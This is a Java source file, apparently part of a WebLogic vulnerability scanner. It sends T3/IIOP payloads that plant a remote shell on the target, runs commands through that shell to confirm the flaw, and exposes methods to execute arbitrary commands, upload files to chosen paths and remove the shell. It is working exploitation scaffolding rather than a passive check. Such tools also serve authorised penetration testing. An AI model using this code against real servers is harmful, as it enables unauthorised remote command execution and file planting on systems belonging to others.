package com.gbw.scanner.plugins.scripts.weblogic.vuls;

import com.gbw.scanner.Host;
import com.gbw.scanner.plugins.scripts.weblogic.GBWJNDIShellClient;
import com.gbw.scanner.plugins.scripts.weblogic.GBWPayloadSend;
import com.gbw.scanner.plugins.scripts.weblogic.GBWScanWeblogicConfig;
import com.gbw.scanner.plugins.scripts.weblogic.GBWWeblogicVersion;
import com.gbw.scanner.plugins.scripts.weblogic.payload.GBWEchoPayload;
import com.gbw.scanner.plugins.scripts.weblogic.shell.GBWT3IIOPShell;
import com.xmap.api.utils.TextUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.List;

public abstract class GBWAbstractEchoVul implements GBWEchoVul {

    private static final Logger log = LoggerFactory.getLogger(GBWAbstractEchoVul.class);

    protected String type;
    protected String code;

    protected List<GBWEchoPayload> echoPayloads;
    protected GBWScanWeblogicConfig config;

    public GBWAbstractEchoVul(GBWScanWeblogicConfig config,String type,String code){

        this.type = type;
        this.code = code;
        this.config = config;
        this.echoPayloads = new ArrayList<>();

    }

    public abstract String getDefaultProto();

    protected void changeProto(Host host){

        String proto = host.getProto();
        String dproto = getDefaultProto();

        host.setProto(dproto);

        if(!TextUtils.isEmpty(proto)&&proto.equals("https")){
            if(dproto.equals("t3"))
                host.setProto("t3s");
        }

    }

    @Override
    public GBWVulCheckResult scan(Host host) {

        changeProto(host);

        String version = GBWWeblogicVersion.getVersion(config,host);
        if(TextUtils.isEmpty(version))
            return null;

        for (GBWEchoPayload payload : echoPayloads) {

            log.info(String.format("For weblogic version:%s,check payload:%s",version,payload.getName()));

            try {

                GBWPayloadSend.send(config,host,payload.getObject(version, GBWT3IIOPShell.class));
                Thread.sleep(config.getScanSleepTime());

                String result = GBWJNDIShellClient.exec(config,host,config.getCmd());
                if (result != null) {
                    log.warn(String.format("Find a weblogic vul,version:%s,check payload:%s,type:%s,code:%s,cmd:%s,result:%s,url:%s//%s:%d",
                            version,
                            payload.getName(),
                            type,
                            code,
                            config.getCmd(),
                            result,
                            host.getProto(),
                            host.getIp(),
                            host.getPort()));


                    System.out.println(String.format("Find a weblogic vul,version:%s,check payload:%s,type:%s,code:%s,cmd:%s,result:%s,url:%s//%s:%d",
                            version,
                            payload.getClass().getSimpleName(),
                            type,
                            code,
                            config.getCmd(),
                            result,
                            host.getProto(),
                            host.getIp(),
                            host.getPort()));

                    return new GBWVulCheckResult(version,code,type,config.getCmd(),result,payload.getName());
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        return null;
    }

    @Override
    public String exec(Host host,String pname,String cmd) {
        return GBWJNDIShellClient.exec(config,host,cmd);
    }

    @Override
    public void upload(Host host,String pname,String path, String text) {
        GBWJNDIShellClient.upload(config,host,path, text);
    }

    @Override
    public void remove(Host host,String pname) {
        GBWJNDIShellClient.remove(config,host);
    }

}
